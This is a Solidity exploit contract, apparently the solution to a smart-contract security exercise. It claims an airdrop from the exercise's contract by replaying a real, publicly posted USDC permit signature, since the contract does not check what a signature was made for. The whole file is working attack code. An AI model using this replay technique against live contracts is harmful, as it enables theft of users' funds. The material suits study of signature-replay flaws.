// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {Exercise4} from "./Exercise4.sol";
import {console2} from "forge-std/Test.sol";

contract Exercise4Exploiter {
    function attack(Exercise4 _victim) external {
        // We just need to grab any message signed by the signer, victim doesnt check any context-specific data
        // Found this https://etherscan.io/tx/0x9050798d7989583632defa0c26e42d9fdfc30a66aa016fea849af303d7eda969
        // 1	token	address	0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
        // 2	value	uint256	49817428
        // 3	deadline	uint256	1666327223
        // 4	v	uint8	28
        // 5	r	bytes32	0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002
        // 6	s	bytes32	0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f
        address owner = 0xB1700C08Aa433b319dEF2b4bB31d6De5C8512D96; // the victim's signer
        address spender = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45; // the contract it allowed to spend some tokens
        uint256 value = 49817428;
        uint256 deadline = 1666327223;
        uint8 v = 28;
        bytes32 r = 0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002;
        bytes32 s = 0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f;

        bytes memory signature = abi.encodePacked(r, s, v);

        // Grabbed the token contract here https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48#readProxyContract
        // Got it's DOMAIN_SEPARATOR and PERMIT_TYPEHASH through inspection
        bytes32 domainSeparator = 0x06c37168a7db5138defc7866392bb87a741f9b3d104deb5094588ce041cae335;
        bytes32 permitTypehash = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

        // Checked the nonce for the address found, luckily its currently 1, so it means it was 0 at that point in time
        uint256 nonce = 0;

        bytes32 structHash = keccak256(
            abi.encode(permitTypehash, owner, spender, value, nonce, deadline)
        );

        bytes32 message = MessageHashUtils.toTypedDataHash(
            domainSeparator,
            structHash
        );

        _victim.claimAirdrop(0, message, signature);
    }
}
